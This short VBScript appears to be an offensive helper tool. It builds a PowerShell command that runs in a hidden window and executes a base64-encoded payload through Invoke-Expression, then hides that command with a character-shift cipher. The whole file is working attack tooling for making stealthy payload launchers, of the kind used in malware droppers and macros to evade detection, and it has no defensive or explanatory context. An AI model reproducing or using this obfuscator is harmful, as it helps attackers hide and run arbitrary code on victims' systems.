envpayload = WScript.Arguments(0)
txt = "powershell -noexit -WindowStyle Hidden -c " & Chr(34) & "IeX ([System.Text.Encoding]::ASCII.GetString([system.Convert]::FromBase64String(" & envpayload & ")));"

Wscript.Echo(encode(txt))

function encode(s)
    For i = 1 To Len(s)
        newtxt = Mid(s,i,1)
        newtxt = Chr(Asc(newtxt) + 3)
        coded = coded + (newtxt)
    Next
    encode = coded
End function